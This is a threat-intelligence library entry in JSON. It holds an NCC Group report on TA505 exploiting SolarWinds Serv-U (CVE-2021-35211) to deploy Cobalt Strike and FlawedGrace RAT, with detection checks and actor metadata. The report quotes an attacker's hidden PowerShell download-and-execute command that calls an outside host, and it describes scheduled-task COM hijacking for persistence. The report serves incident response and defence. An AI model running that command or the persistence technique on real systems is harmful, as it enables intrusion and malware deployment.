# 0-raw-data/ORKL/library/jsons_entries/4e335442-7f58-4a57-a709-48c0261ceab0.json
{
    "id": "4e335442-7f58-4a57-a709-48c0261ceab0",
    "created_at": "2023-01-12T15:10:50.074281Z",
    "updated_at": "2025-03-27T02:15:37.905093Z",
    "deleted_at": null,
    "sha1_hash": "f9c9891243f6a0cde052b53d0dd20c3f5b2421f2",
    "title": "2021-11-08 - TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access",
    "authors": "",
    "file_creation_date": "2022-05-28T23:17:26Z",
    "file_modification_date": "2022-05-28T23:17:26Z",
    "file_size": 171460,
    "plain_text": "# TA505 exploits SolarWinds Serv-U vulnerability (CVE- 2021-35211) for initial access\n\n**[research.nccgroup.com/2021/11/08/ta505-exploits-solarwinds-serv-u-vulnerability-cve-2021-35211-for-initial-access/](https://research.nccgroup.com/2021/11/08/ta505-exploits-solarwinds-serv-u-vulnerability-cve-2021-35211-for-initial-access/)**\n\nNovember 8, 2021\n\nNCC Group’s global Cyber Incident Response Team has observed an increase in Clop\nransomware victims in the past weeks. The surge can be traced back to a vulnerability in\nSolarWinds Serv-U that is being abused by the TA505 threat actor. TA505 is a known\ncybercrime threat actor, who is known for extortion attacks using the Clop ransomware. We\nbelieve exploiting such vulnerabilities is a recent initial access technique for TA505, deviating\nfrom the actor’s usual phishing-based approach.\n\nNCC Group strongly advises updating systems running SolarWinds Serv-U software to the\nmost recent version (at minimum version 15.2.3 HF2) and checking whether exploitation has\nhappened as detailed below.\n\n\n-----\n\nWe are sharing this information as a call to action for organisations using SolarWinds Serv-U\nsoftware and incident responders currently dealing with Clop ransomware.\n\n## Modus Operandi\n\n### Initial Access\n\nDuring multiple incident response investigations, NCC Group found that a vulnerable version\nof SolarWinds Serv-U server appeared to be the initial access used by TA505 to breach its\nvictims’ IT infrastructure. The vulnerability being exploited is known as CVE-2021-35211 [1].\n\nSolarWinds published a security advisory [2] detailing the vulnerability in the Serv-U software\non July 9, 2021. The advisory mentions that Serv-U Managed File Transfer and Serv-U\nSecure FTP are affected by the vulnerability. On July 13, 2021, Microsoft published an article\n\n[3] on CVE-2021-35211 being abused by a Chinese threat actor referred to as DEV-0322.\nHere we describe how TA505, a completely different threat actor, is exploiting that\nvulnerability.\n\nSuccessful exploitation of the vulnerability, as described by Microsoft [3], causes Serv-U to\nspawn a subprocess controlled by the adversary. That enables the adversary to run\ncommands and deploy tools for further penetration into the victim’s network. Exploitation also\ncauses Serv-U to log an exception, as described in the section below on checks for potential\ncompromise.\n\n### Execution\n\nWe observed that Base64 encoded PowerShell commands were logged shortly after the\nServ-U exceptions indicating exploitation. The PowerShell commands ultimately led to\ndeployment of a Cobalt Strike Beacon on the system running the vulnerable Serv-U\nsoftware.\n\nThe PowerShell command observed deploying Cobalt Strike was:\n```\npowershell.exe -nop -w hidden -c IEX ((new-object\nnet.webclient).downloadstring('hxxp://IP:PORT/a'))\n\n### Persistence\n\n```\nOn several occasions the threat actor tried to maintain its foothold by hijacking a scheduled\ntask named RegIdleBackup and abusing the COM handler associated with it to execute\nmalicious code, leading to FlawedGrace RAT.\n\nThe RegIdleBackup task is a legitimate task that is stored in \\Microsoft\\Windows\\Registry.\nThe task is normally used to regularly backup the registry hives. By default, the CLSID in the\nCOM handler is set to: {CA767AA8-9157-4604-B64B-40747123D5F2}. In all cases where we\n\n\n-----\n\nobserved the threat actor abusing the task for persistence, the COM handler was altered to a\ndifferent CLSID.\n\nCLSID objects are stored in registry in HKLM\\SOFTWARE\\Classes\\CLSID. In our\ninvestigations the task included a suspicious CLSID, which subsequently redirected to\nanother CLSID. The second CLSID included three objects containing the FlawedGrace RAT\nloader. The objects contain Base64 encoded strings that ultimately lead to the executable.\n\n## Checks for potential compromise\n\n### Check for exploitation of Serv-U\n\nNCC Group recommends looking for potentially vulnerable Serv-U FTP-servers in your\nnetwork and checking these logs for traces of similar exceptions as suggested by the\nSolarWinds security advisory. It is important to note that the publications by Microsoft and\nSolarWinds describe follow-up activity regarding a completely different threat actor than we\nobserved in our investigations.\n\nMicrosoft’s article [3] on CVE-2021-35211 provides guidance on the detection of the abuse of\nthe vulnerability. The first indicator of compromise for the exploitation of this vulnerability are\nsuspicious entries in a Serv-U log file named DebugSocketlog.txt. This log file is usually\nlocated in the Serv-U installation folder. Looking at this log file it contains exceptions at the\ntime of exploitation of CVE-2021-35211. NCC Group’s analysts encountered the following\nexceptions during their investigations:\n\n```\nEXCEPTION: C0000005; CSUSSHSocket::ProcessReceive();\n\n```\n\nHowever, as mentioned in Microsoft’s article, this exception is not by definition an indicator of\nsuccessful exploitation and therefore further analysis should be carried out to determine\npotential compromise.\n\n### Check for suspicious PowerShell commands\n\nAnalysts should look for suspicious PowerShell commands being executed close to the date\nand time of the exceptions. The full content of PowerShell commands is usually recorded in\nEvent ID 4104 in the Windows Event logs.\n\n### Check for RegIdleBackup task abuse\n\nAnalysts should look for the RegIdleBackup task with an altered CLSID. Subsequently, the\nsuspicious CLSID should be used to query the registry and check for objects containing\nBase64 encoded strings. The following PowerShell commands assist in checking for the\nexistence of the hijacked task and suspicious CLSID content:\n\n\n-----\n\n```\n# Check for altered RegIdleBackup task\nExport-ScheduledTask -TaskName \"RegIdleBackup\" -TaskPath\n\"\\Microsoft\\Windows\\Registry\\\" | Select-String -NotMatch \"{CA767AA8-91574604-B64B-40747123D5F2}\"\n# Check for suspicious CLSID registry key content\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Classes\\CLSID{SUSPICIOUS_CLSID}'\n\n### Summary of checks\n\n```\nThe following steps should be taken to check whether exploitation led to a suspected\ncompromise by TA505:\n\nCheck if your Serv-U version is vulnerable\nLocate the Serv-U’s DebugSocketlog.txt\nSearch for entries such as ‘EXCEPTION: C0000005;\nCSUSSHSocket::ProcessReceive();’ in this log file\nCheck for Event ID 4104 in the Windows Event logs surrounding the date/time of the\nexception and look for suspicious PowerShell commands\nCheck for the presence of a hijacked Scheduled Task named RegIdleBackup using the\nprovided PowerShell command\n\nIn case of abuse: the CLSID in the COM handler should NOT be set to\n{CA767AA8-9157-4604-B64B-40747123D5F2}\nIf the task includes a different CLSID: check the content of the CLSID objects in the\nregistry using the provided PowerShell command, returned Base64 encoded strings\ncan be an indicator of compromise.\n\n## Vulnerability Landscape\n\nThere are currently still many vulnerable internet-accessible Serv-U servers online around\nthe world.\n\nIn July 2021 after Microsoft published about the exploitation of Serv-U FTP servers by DEV0322, NCC Group mapped the internet for vulnerable servers to gauge the potential impact\nof this vulnerability. In July, 5945 (~94%) of all Serv-U (S)FTP services identified on port 22\nwere potentially vulnerable. In October, three months after SolarWinds released their patch,\nthe number of potentially vulnerable servers is still significant at 2784 (66.5%).\n\nThe top countries with potentially vulnerable Serv-U FTP services at the time of writing are:\n\n**Amount** **Country**\n\n**1141** China\n\n**549** United States\n\n\n-----\n\n**99** Canada\n\n**92** Russia\n\n**88** Hong Kong\n\n**81** Germany\n\n**65** Austria\n\n**61** France\n\n**57** Italy\n\n**50** Taiwan\n\n**36** Sweden\n\n**31** Spain\n\n**30** Vietnam\n\n**29** Netherlands\n\n**28** South Korea\n\n**27** United Kingdom\n\n**26** India\n\n**21** Ukraine\n\n**18** Brazil\n\n**17** Denmark\n\nTop vulnerable versions identified:\n\n**Amount** **Version**\n\n**441** SSH-2.0-Serv-U_15.1.6.25\n\n**236** SSH-2.0-Serv-U_15.0.0.0\n\n**222** SSH-2.0-Serv-U_15.0.1.20\n\n**179** SSH-2.0-Serv-U_15.1.5.10\n\n**175** SSH-2.0-Serv-U_14.0.1.0\n\n**143** SSH-2.0-Serv-U_15.1.3.3\n\n\n-----\n\n**138** SSH-2.0-Serv-U_15.1.7.162\n\n**102** SSH-2.0-Serv-U_15.1.1.108\n\n**88** SSH-2.0-Serv-U_15.1.0.480\n\n**85** SSH-2.0-Serv-U_15.1.2.189\n\n## MITRE ATT&CK mapping\n\n**Tactic** **Technique** **Procedure**\n\n\nInitial\nAccess\n\n\nT1190 – Exploit\nPublic Facing\nApplication(s)\n\n\nTA505 exploited CVE-2021-35211 to gain remote code\nexecution.\n\nTA505 used Base64 encoded PowerShell commands\nto download and run Cobalt Strike Beacons on target\nsystems.\n\nTA505 hijacked a scheduled task named\nRegIdleBackup and abused the COM handler\nassociated with it to execute malicious code and gain\npersistence.\n\nTA505 altered the registry so that the RegIdleBackup\nscheduled task executed the FlawedGrace RAT loader,\nwhich was stored as Base64 encoded strings in the\nregistry.\n\n\nExecution T1059.001 –\nCommand and\nScripting\nInterpreter:\nPowerShell\n\nPersistence T1053.005 –\nScheduled\nTask/Job:\nScheduled Task\n\n\nDefense\nEvasion\n\n## References\n\n\nT1112 – Modify\nRegistry\n\n\n\n[1] [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35211)\n\n[2] [https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35211](https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35211)\n\n[3] https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actortargeting-solarwinds-serv-u-software-with-0-day-exploit/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-08 - TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access.pdf"
    ],
    "report_names": [
        "2021-11-08 - TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0a80df4d-5ab7-4ca3-809d-8ef7b5a54f1f",
            "created_at": "2023-11-21T02:00:07.386886Z",
            "updated_at": "2025-03-27T02:00:03.248375Z",
            "deleted_at": null,
            "main_name": "TiltedTemple",
            "aliases": [
                "DEV-0322",
                "Circle Typhoon"
            ],
            "source_name": "MISPGALAXY:TiltedTemple",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536250,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1653779846,
    "ts_modification_date": 1653779846,
    "files": {
        "pdf": "https://archive.orkl.eu/f9c9891243f6a0cde052b53d0dd20c3f5b2421f2.pdf",
        "text": "https://archive.orkl.eu/f9c9891243f6a0cde052b53d0dd20c3f5b2421f2.txt",
        "img": "https://archive.orkl.eu/f9c9891243f6a0cde052b53d0dd20c3f5b2421f2.jpg"
    }
}